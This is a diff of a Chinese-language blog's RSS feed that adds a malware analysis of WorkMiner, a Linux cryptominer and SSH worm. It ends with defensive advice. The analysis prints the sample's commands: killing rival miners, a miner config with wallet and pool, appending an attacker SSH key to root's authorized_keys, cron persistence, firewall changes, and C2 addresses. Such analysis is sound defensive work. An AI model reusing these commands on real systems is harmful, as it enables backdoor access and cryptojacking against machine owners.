@@ -1,12 +1,260 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 	<channel>
-		<title>Media on alee</title>
+		<title>Mediums on alee</title>
 		<link>https://www.a1ee.cn/medium/</link>
-		<description>Recent content in Media on alee</description>
+		<description>Recent content in Mediums on alee</description>
 		<generator>Hugo -- gohugo.io</generator>
 		<language>zh-cn</language>
-		<lastBuildDate>Thu, 24 Jun 2021 15:22:11 +0800</lastBuildDate>
+		<lastBuildDate>Wed, 01 Sep 2021 08:59:16 +0800</lastBuildDate>
 		<atom:link href="https://www.a1ee.cn/medium/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>WorkMiner</title>
+			<link>https://www.a1ee.cn/medium/workminer/</link>
+			<pubDate>Wed, 01 Sep 2021 08:59:16 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/medium/workminer/</guid>
+			<description>WorkMiner样本分析 样本信息 使用DIE查看样本情况： 脱壳 使用upx3.93脱壳失败，提示： upx: work64: CantUnpackException: p_info corrupted 使用文本标记其查看二进制文件，发现</description>
+			<content type="html"><![CDATA[<h1 id="workminer样本分析">WorkMiner样本分析</h1>
+<h2 id="样本信息">样本信息</h2>
+<p>使用<code>DIE</code>查看样本情况：</p>
+<p><img src="/workminer_images/2436651160000.png" alt=""></p>
+<h2 id="脱壳">脱壳</h2>
+<p>使用<code>upx3.93</code>脱壳失败，提示：</p>
+<pre><code>upx: work64: CantUnpackException: p_info corrupted
+</code></pre><p>使用文本标记其查看二进制文件，发现<code>p_info</code>被修改了：</p>
+<p><img src="/workminer_images/2446734175295.png" alt=""></p>
+<p>从末尾找到文件大小：</p>
+<p><img src="/workminer_images/1805533162309.png" alt=""></p>
+<p>修复<code>p_info</code>即可成功脱壳：</p>
+<p><img src="/workminer_images/367734177793.png" alt=""></p>
+<h2 id="去除混淆">去除混淆</h2>
+<p>脱壳后，使用<code>IDA</code>加载，查找字符串，发现是<code>golang</code>程序：</p>
+<p><img src="/workminer_images/5157232166555.png" alt=""></p>
+<p>使用<code>IDAGolangHelper</code>解除混淆可正常分析。</p>
+<h2 id="功能分析">功能分析</h2>
+<h3 id="main_killminer">main_killminer</h3>
+<p>执行命令终止其他挖矿进程</p>
+<p><img src="/workminer_images/980700198976.png" alt=""></p>
+<p>命令列表如下：</p>
+<pre><code>ps -ef | grep ddg | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep xmr | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep tcp: | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep x86_ | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep miner | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep pool. | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep monero | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep prohash | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep stratum | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep .daemond | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep Circle_MI | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep kworker34 | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep cryptonight | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep /tmp/thisxxs | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep /usr/bin/.sshd | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep /opt/yilu/mservice | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep /opt/yilu/work/xig/xig | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep /usr/bin/bsd-port/getty | grep -v grep | awk '{print $2}' | xargs kill -9
+</code></pre><h3 id="文件释放">文件释放</h3>
+<p>检查是否存在环境变量<code>TMPDIR</code>，切换到<code>/tmp</code>目录下执行<code>killall xmr</code>命令，将系统命令：<code>wget</code>改为<code>wget1</code>、<code>curl</code>改为<code>curl1</code>：</p>
+<p><img src="/workminer_images/3871249213222.png" alt=""></p>
+<p>生成配置文件：<code>/tmp/config.json</code></p>
+<p><img src="/workminer_images/4658020187658.png" alt=""></p>
+<p>配置文件内容如下（其中包含了挖矿钱包）：</p>
+<pre><code>{
+	&quot;api&quot;: {
+		&quot;id&quot;: null,
+		&quot;worker-id&quot;: null
+	},
+	&quot;http&quot;: {
+		&quot;enabled&quot;: false,
+		&quot;host&quot;: &quot;127001&quot;,
+		&quot;port&quot;: 0,
+		&quot;access-token&quot;: null,
+		&quot;restricted&quot;: true
+	},
+	&quot;autosave&quot;: true,
+	&quot;background&quot;: true,
+	&quot;colors&quot;: true,
+	&quot;title&quot;: true,
+	&quot;randomx&quot;: {
+		&quot;init&quot;: -1,
+		&quot;mode&quot;: &quot;auto&quot;,
+		&quot;1gb-pages&quot;: false,
+		&quot;rdmsr&quot;: true,
+		&quot;wrmsr&quot;: false,
+		&quot;numa&quot;: true
+	},
+	&quot;cpu&quot;: {
+		&quot;enabled&quot;: true,
+		&quot;huge-pages&quot;: true,
+		&quot;hw-aes&quot;: null,
+		&quot;priority&quot;: null,
+		&quot;memory-pool&quot;: false,
+		&quot;yield&quot;: true,
+		&quot;argon2-impl&quot;: null,
+		&quot;astrobwt-max-size&quot;: 550,
+		&quot;astrobwt-avx2&quot;: false,
+		&quot;argon2&quot;: [0],
+		&quot;astrobwt&quot;: [-1],
+		&quot;cn&quot;: [
+			[1, 0]
+		],
+		&quot;rx&quot;: [0],
+		&quot;rx/wow&quot;: [0],
+		&quot;cn/0&quot;: false,
+		&quot;rx/arq&quot;: &quot;rx/wow&quot;,
+		&quot;rx/keva&quot;: &quot;rx/wow&quot;
+	},
+	&quot;donate-level&quot;: 0,
+	&quot;donate-over-proxy&quot;: 1,
+	&quot;log-file&quot;: null,
+	&quot;pools&quot;: [{
+		&quot;algo&quot;: null,
+		&quot;coin&quot;: null,
+		&quot;url&quot;: &quot;xmrcrypto-poolfr:6666&quot;,
+		&quot;user&quot;: &quot;47BD6QNfkWf8ZMQSdqp2tY1AdG8ofsEPf4mcDp1YB4AX32hUjoLjuDaNrYzXk7cQcoPBzAuQrmQTgNgpo6XPqSBLCnfsjaV&quot;,
+		&quot;pass&quot;: &quot;x&quot;,
+		&quot;rig-id&quot;: null,
+		&quot;nicehash&quot;: false,
+		&quot;keepalive&quot;: false,
+		&quot;enabled&quot;: true,
+		&quot;tls&quot;: false,
+		&quot;tls-fingerprint&quot;: null,
+		&quot;daemon&quot;: false,
+		&quot;socks5&quot;: null,
+		&quot;self-select&quot;: null
+	}],
+	&quot;print-time&quot;: 60,
+	&quot;retries&quot;: 5,
+	&quot;retry-pause&quot;: 5,
+	&quot;syslog&quot;: false,
+	&quot;user-agent&quot;: null,
+	&quot;verbose&quot;: 0,
+	&quot;watch&quot;: true
+}
+</code></pre><p>将<code>elf</code>格式的二进制文件写入到<code>/tmp/xmr</code>中：</p>
+<p><img src="/workminer_images/2204351171322.png" alt=""></p>
+<p>添加可执行权限：</p>
+<p><img src="/workminer_images/2258155195435.png" alt=""></p>
+<p>生成<code>/tmp/secure.sh</code>脚本并添加可执行权限：</p>
+<p><img src="/workminer_images/5877555184733.png" alt=""></p>
+<p>脚本内容如下：</p>
+<pre><code>#!/bin/bash
+
+LIMIT=8
+while true ; do
+    TIME=$(date '+%b %e %H')     #example: Apr 11 11
+    BLOCK_IP=$(grep &quot;$TIME&quot; /var/log/secure|grep Failed|awk '{print $(NF-3)}'|sort|uniq -c|awk '$1&gt;&quot;$LIMIT&quot;{print $1&quot;:&quot;$2}')
+    for i in $BLOCK_IP
+    do
+        IP=$(echo $i|awk -F: '{print $2}')
+        grep $IP /etc/hosts.deny &gt; /dev/null
+        if [ $? -gt 0 ];
+        then
+            echo &quot;sshd:$IP&quot; &gt;&gt; /etc/hosts.deny
+        fi
+    done
+    sleep 60
+done
+</code></pre><p>生成<code>/tmp/auth.sh</code>脚本并添加可执行权限：</p>
+<p><img src="/workminer_images/141357180984.png" alt=""></p>
+<p>脚本内容如下：</p>
+<pre><code>#!/bin/bash
+
+LIMIT=8
+while true ; do
+    TIME=$(date '+%b %e %H')     #example: Apr 11 11
+    BLOCK_IP=$(grep &quot;$TIME&quot; /var/log/auth.log|grep Failed|awk '{print $(NF-3)}'|sort|uniq -c|awk '$1&gt;&quot;$LIMIT&quot;{print $1&quot;:&quot;$2}')
+    for i in $BLOCK_IP
+    do
+        IP=$(echo $i|awk -F: '{print $2}')
+        grep $IP /etc/hosts.deny &gt; /dev/null
+        if [ $? -gt 0 ];
+        then
+            echo &quot;sshd:$IP&quot; &gt;&gt; /etc/hosts.deny
+        fi
+    done
+    sleep 60
+done
+</code></pre><p>检查是否存在<code>/usr/.work</code>，不存在则创建：</p>
+<p><img src="/workminer_images/5425616185658.png" alt=""></p>
+<p>将当前路径（<code>/tmp</code>）下的文件拷贝到<code>/usr/.work</code>中去</p>
+<p><img src="/workminer_images/2576720186267.png" alt=""></p>
+<h3 id="main_add_crontab_job">main_add_crontab_job</h3>
+<p>检查是否存在<code>/root/.ssh</code>，不存在则创建，然后设置权限为<code>700</code>：</p>
+<p><img src="/workminer_images/3347128191123.png" alt=""></p>
+<p>生成<code>/root/.ssh/authorized_keys</code>，设置权限为<code>600</code>，并使用<code>echo</code>写入内容：</p>
+<p><img src="/workminer_images/5574831203213.png" alt=""></p>
+<p>写入公钥命令为：</p>
+<pre><code>echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc3BlbiQaznPT8TScrs9YIzmrpI9Lpa4LtCjB5z0LuQ4o6XwvzomxAixn2F1jaUl175Cxcg3PmUsPOLE+WeWicKqL2YZ46SotjZgnS6JjXpuZVi7V0DSiXu0itlwWDC9m8huBvUBSIsDCsgb9OeG6rlrCyZgTW+qZciK+KZ8rwlFp3CFyxoF2122ueOnl5pAUCy1iHqGun03dMdUxA1d3KnxSZ3NQrYiH69dc8/YhV4SriOW9psc0pv9KeBLF0OXHtEAdbnSlwfk2uTjjBMK0nDidl7wS52Ygi/H4+P+4EXkSzf4Jj4/L6P3c5rLC3/l3RFdo1T7EQ8fH6NsTYJNZ7 root@u911&quot; &gt;&gt; /root/.ssh/authorized_keys
+</code></pre><p>检测是否存在以下文件：</p>
+<pre><code>/etc/rc.d/rc.local
+/etc/rc.local
+/etc/rc.conf
+/etc/crontab
+</code></pre><p><img src="/workminer_images/1157936208252.png" alt=""></p>
+<p>检测是否存在以下文件：</p>
+<pre><code>/var/spool/cron/root
+/var/spool/cron/crontabs
+</code></pre><p><img src="/workminer_images/1021943209547.png" alt=""></p>
+<p>附加文件：</p>
+<pre><code>/var/spool/cron/root
+/var/spool/cron/crontabs/root
+</code></pre><p><img src="/workminer_images/4794654210549.png" alt=""></p>
+<h3 id="修改防火墙规则">修改防火墙规则</h3>
+<p>执行命令，修改防火墙规则：</p>
+<p><img src="/workminer_images/5133802220726.png" alt=""></p>
+<p>修改命令如下：</p>
+<pre><code>iptables -I INPUT  -p tcp --dport
+iptables -I OUTPUT -p tcp --sport
+iptables -I POSTROUTING -t nat -p tcp --sport
+iptables -I PREROUTING  -t nat -p tcp --dport
+iptables -I INPUT  -p udp --dport %d -j ACCEPT
+iptables -I OUTPUT -p udp --sport %d -j ACCEPT
+iptables -I PREROUTING  -t nat -p udp --dport %d -j ACCEPT
+iptables -I POSTROUTING -t nat -p udp --sport %d -j ACCEPT
+</code></pre><h3 id="ssh蠕虫攻击">ssh蠕虫攻击</h3>
+<p>在修改完防火墙规则后，执行<code>__home_haha_work_go_sshworm_work_Crackssh</code>函数，对<code>ssh</code>服务进行<code>Crack</code>：</p>
+<p><img src="/workminer_images/2778508206278.png" alt=""></p>
+<p>根据函数名，检索函数列表得出如下函数列：</p>
+<p><img src="/workminer_images/4634517222557.png" alt=""></p>
+<h3 id="main__cfunc_getconf">main__Cfunc_GetConf</h3>
+<p>在执行完<code>ssh蠕虫攻击</code>后，最后调用<code>main__Cfunc_GetConf</code></p>
+<p><img src="/workminer_images/3660828202700.png" alt=""></p>
+<p>层层深入后发现恶意外链：</p>
+<p><img src="/workminer_images/1768926215602.png" alt=""></p>
+<p>P2P节点如下：</p>
+<pre><code>router.bittorrent.com:6881
+bttracker.debian.org:6881
+router.utorrent.com:6881
+dht.transmissionbt.com:6881
+</code></pre><p>恶意CC如下：</p>
+<pre><code>212.129.33.59:6881
+82.221.103.244:6881
+130.239.18.159:6881
+87.98.162.88:6881
+</code></pre><h2 id="总结">总结</h2>
+<p>主机感染木马后执行流程大致如下：</p>
+<ol>
+<li>杀掉本地已有的挖矿进程；</li>
+<li>切换至<code>/tmp</code>路径，杀死<code>xmr</code>进程；</li>
+<li>将系统命令<code>wget</code>改为<code>wget1</code>、<code>curl</code>改为<code>curl1</code>；</li>
+<li>生成挖矿程序的配置文件<code>config.json</code>；</li>
+<li>将挖矿程序写入到<code>xmr</code>中并执行；</li>
+<li>生成<code>secure.sh</code>、<code>auth.sh</code>脚本并执行；</li>
+<li>将<code>/tmp</code>下的文件拷贝到<code>/usr/.work</code>中去；</li>
+<li>向<code>/root/.ssh/authorized_keys</code>中写入公钥，方便攻击者连接；</li>
+<li>检测计划任务文件并添加计划任务；</li>
+<li>修改防火墙规则，方便出站；</li>
+<li>使用ssh蠕虫攻击其它主机；</li>
+<li>访问外部链接；</li>
+</ol>
+<h2 id="建议">建议</h2>
+<p>建议将上述的恶意CC及矿池地址（<code>xmr.crypto-pool.fr</code>,IP:<code>163.172.226.137</code>）添加至防火墙出站规则；</p>
+<p>建议修改SSH服务端口，设置SSH服务基线，禁用Root用户登录、杜绝弱口令及设置错误限制次数；</p>
+]]></content>
+		</item>
 		
 		<item>
 			<title>AgentTesla</title>
